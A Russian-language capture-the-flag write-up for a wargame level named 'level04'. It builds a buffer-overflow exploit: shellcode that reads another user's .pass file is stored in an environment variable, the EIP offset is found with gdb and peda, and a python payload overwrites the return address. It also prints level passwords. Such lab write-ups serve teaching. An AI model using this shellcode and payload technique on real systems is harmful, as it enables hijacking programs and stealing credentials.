## HowTo

```
> su level04
kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf
```

### Инструменты:
- gdb + peda
- Ida Pro + hex rays

**NB:** Для работы с файлом стягиваем его на локальную машину

### Анализ и ход решения

1. Форкается процесс, после чего запускается исполнение дочернего.
2. Результат (`pid`) записывается в переменную
3. Данные дочернего процесса (информация о регистрах и их состояниях в т.ч) 
загружается в родительский процесс через ptrace(`PEEKUSER`, `pid`) 


**ИДЕЯ ВЗЛОМА**

Подложить в адрес возврата дочернего процесса вредоносный код, чтобы он был загружен на стадии `ptrace`. 
Мы не можем запустить код внутри дочернего процесса т.к. `ptrace()` не допускает прямого `exec`

1. Т.к. чтения нужного нам файла (`.pass`) нигде не происходит, мы будем использовать шеллкод, который умеет читать и печатать нужный файл

http://shell-storm.org/shellcode/files/shellcode-73.php
```
\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass
```

2. Чтение внутри процессов происходит через `gets`, так что переполнить его напрямую не получится.
Поэтому мы будем использовать переменные окружения

3. Создаем переменную окружения, подкладываем туда наш шеллкод
```
> export EXPLOIT=$"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass"
```
4. Нам будет нужно достать адрес переменной.
- Способ 1
```
> gdb ./level04
> set follow-fork-mode child
> b* main+1

> run
> show environment 
... list of envs - find position of EXPLOIT ...
> print *((char**)environ+<var_position>)
```

- Способ 2

Использовать сишный файл в приложении.\
**Важно**: компилируем в mode 32 (`gcc -m32`)
```
./print_var EXPLOIT
```

**Адрес переменной** (адрес может отличаться при новом запуске)
```
0xffffd80e
```

5. Находим смещение до `eip` дочернего процесса с использованием `peda`
```
> gdb ./level04
> set follow-fork-mode child
> pattern create 200 (размер паттерна экспериментальный) -> ...pattern...

> run < <(echo '...pattern...')
> patts eip
EIP+0 found at offset: 156
```
7. У нас есть оффсет до `EIP` дочернего процесса `= 156`. 
У нас есть адрес переменной окружения, где лежит наш код `0xffffd80e`

8. Готовим `pyaload`
```
> python -c 'print "A" * 156 + "\x0e\xd8\xff\xff"' | ./level04
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```